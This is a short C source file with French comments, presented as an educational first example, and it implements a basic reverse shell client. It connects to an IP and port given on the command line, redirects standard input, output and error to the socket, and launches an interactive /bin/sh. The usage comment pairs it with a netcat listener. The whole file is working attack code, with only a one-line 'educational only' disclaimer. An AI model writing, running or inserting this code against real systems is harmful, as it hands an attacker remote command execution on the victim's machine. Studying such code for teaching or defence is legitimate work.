/*
 * EXEMPLE 1 : Reverse Shell Basique
 * 
 * Version simplifiée sans chiffrement pour comprendre les bases.
 * 
 * USAGE:
 *   Terminal 1 (Server): nc -lvp 4444
 *   Terminal 2 (Client): ./basic_shell 127.0.0.1 4444
 * 
 * ⚠️  ÉDUCATIF UNIQUEMENT - Tests sur VOS machines
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4444

int main(int argc, char **argv) {
    const char *ip = (argc > 1) ? argv[1] : SERVER_IP;
    int port = (argc > 2) ? atoi(argv[2]) : SERVER_PORT;
    
    printf("[*] Reverse Shell Client (Basic)\n");
    printf("[*] Connecting to %s:%d...\n", ip, port);
    
    // ════════════════════════════════════════
    // ÉTAPE 1 : Créer socket
    // ════════════════════════════════════════
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }
    
    // ════════════════════════════════════════
    // ÉTAPE 2 : Configuration serveur
    // ════════════════════════════════════════
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server.sin_addr);
    
    // ════════════════════════════════════════
    // ÉTAPE 3 : Connexion
    // ════════════════════════════════════════
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        close(sock);
        return 1;
    }
    
    printf("[+] Connected!\n");
    
    // ════════════════════════════════════════
    // ÉTAPE 4 : Redirection I/O
    // ════════════════════════════════════════
    dup2(sock, 0);  // stdin  → socket
    dup2(sock, 1);  // stdout → socket
    dup2(sock, 2);  // stderr → socket
    
    // ════════════════════════════════════════
    // ÉTAPE 5 : Lancer shell
    // ════════════════════════════════════════
    char *args[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", args, NULL);
    
    // Si on arrive ici, execve a échoué
    perror("execve");
    return 1;
}

